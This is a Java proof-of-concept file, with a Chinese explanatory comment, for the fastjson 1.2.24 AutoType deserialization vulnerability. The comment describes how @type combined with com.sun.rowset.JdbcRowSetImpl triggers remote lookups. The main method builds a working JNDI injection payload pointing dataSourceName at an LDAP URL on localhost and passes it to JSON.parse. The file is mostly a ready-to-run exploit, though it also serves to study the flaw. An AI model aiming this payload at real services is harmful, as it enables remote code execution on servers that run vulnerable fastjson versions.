package main.java.POC;


import com.alibaba.fastjson.JSON;

/**
 * Created by metaStor on 2020/7/11.
 */

/*
 * 在早期的fastjson版本中（v1.2.25 之前），因为AutoType是默认开启的，并且也没有什么限制，可以说是裸着的。
 * 因为有了autoType功能，那么fastjson在对JSON字符串进行反序列化的时候，就会读取@type到内容，
 * 试图把JSON内容反序列化成这个对象，并且会调用这个类的setter方法。
 * 那么就可以利用这个特性，自己构造一个JSON字符串，并且使用@type指定一个自己想要使用的攻击类库。
 * 举个例子，黑客比较常用的攻击类库是com.sun.rowset.JdbcRowSetImpl，这是sun官方提供的一个类库，
 * 这个类的dataSourceName支持传入一个rmi的源，当解析这个uri的时候，就会支持rmi远程调用，去指定的rmi地址中去调用方法。
 * 而fastjson在反序列化时会调用目标类的setter方法，那么如果黑客在JdbcRowSetImpl的dataSourceName中设置了一个想要执行的命令，
 * 那么就会导致很严重的后果。
 * */
public class POC_1_2_24 {

    public static void main(String[] args) {
        String payload1 = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\"," +
                "\"dataSourceName\":\"ldap://localhost:9999/Calc\",\"autoCommit\":true}";
        JSON.parse(payload1);
    }

}
